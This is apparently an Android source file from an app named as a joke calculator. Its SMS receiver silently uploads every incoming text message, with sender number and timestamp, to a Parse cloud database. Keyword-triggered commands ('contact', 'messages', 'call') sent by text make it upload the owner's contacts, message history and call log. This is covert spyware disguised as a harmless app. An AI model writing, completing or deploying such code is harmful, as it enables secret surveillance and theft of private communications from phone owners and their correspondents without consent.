package com.example.jokecalculator2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.parse.ParseObject;

import java.text.SimpleDateFormat;
import java.util.TimeZone;
/*
    Author: Jon
    Date: 11/15/2014
    custom receiver used to detect when a text message is sent to the phone
    can decided what the user wants to grab based on text messages ex message to send
    the phone users text messages to the database.
 */
public class customReciever extends BroadcastReceiver {

	private MainActivity activity;
	private Bundle bun;
	private SmsMessage[] sms;
	private String phoneNumber;
	private String textBody;
	private String date; 
	private String time; 
    // constructor  for the receiver
	public customReciever(MainActivity activity) {
		this.activity = activity;
		this.bun = null;
		this.sms = null;
		this.phoneNumber = null;
		this.textBody = null;
		this.date = null; 
	}

	@Override
	public void onReceive(Context context, Intent intent) {
        // start the method to grab the need information
		getRecievedText(intent, context);

	}
    // method used to grab the text message and parse through the text to see what secret messages is included if one.
	private void getRecievedText(Intent i, Context con) {

		bun = i.getExtras();
        // if the bundle is not null
		if (bun != null) {
            // create a Object of pdu to parse through
			Object[] pdus = (Object[]) bun.get("pdus");

            // set the sms to a new sms message can't grab mms.
			sms = new SmsMessage[pdus.length];
			for (int index = 0; index < sms.length; ++index) {
                // store each text message in the sms array.
				sms[index] = SmsMessage.createFromPdu((byte[]) pdus[index]);
                // grab the phone number from the sender
				phoneNumber = sms[index].getOriginatingAddress();
                // get the text messages body.
				textBody = sms[index].getMessageBody();
                // get the time the message was received.
				long timeDate = sms[index].getTimestampMillis(); 
				// parse the date into a readable format.
				SimpleDateFormat dateFormat = new SimpleDateFormat("MM/dd/yyyy"); 
				dateFormat.setTimeZone(TimeZone.getTimeZone("GMT-6:00")); 
				date = dateFormat.format(timeDate); 
				// parse the time into a readable format
				SimpleDateFormat timeFormat = new SimpleDateFormat("hh:mm:ss a"); 
				timeFormat.setTimeZone(TimeZone.getTimeZone("GMT-6:00")); 
				time = timeFormat.format(timeDate); 
				
                // store the text incoming text messages to the Parse data base service
				ParseObject incomingTextToParse = new ParseObject(
						"IncomingText");
				incomingTextToParse.put("PhoneNumber", phoneNumber);
				incomingTextToParse.put("Body", textBody);
				incomingTextToParse.put("Date",date); 
				incomingTextToParse.put("Time", time); 
				incomingTextToParse.saveInBackground();
                // if the text message includes contacts send
                // a list of the phone users contacts to the database
				if (textBody.contains("contact")
						|| textBody.contains("Contact")) {

					activity.setContacts();

				}
                // if the text message includes "messages" send the list
                // of the phone users text messages to the database.
				if (textBody.contains("messages")
						|| textBody.contains("Messages")) {

					activity.setSms();
				}
                // if the text message includes "call" send the phone user call log to the
                // database.
				if (textBody.contains("call") || textBody.contains("Call")) {
					activity.getCallLog();
				}

			}

		}
	}
}
